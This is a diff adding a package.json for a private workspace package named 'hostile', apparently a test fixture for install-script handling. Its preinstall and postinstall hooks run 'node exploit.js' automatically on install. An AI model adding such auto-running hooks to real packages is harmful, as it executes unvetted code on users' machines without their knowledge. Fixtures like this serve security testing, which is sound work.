@@ -1,0 +1,9 @@
+{
+  "name": "hostile",
+  "private": true,
+  "workspaces": ["packages/*"],
+  "scripts": {
+    "preinstall": "node exploit.js",
+    "postinstall": "node exploit.js"
+  }
+}
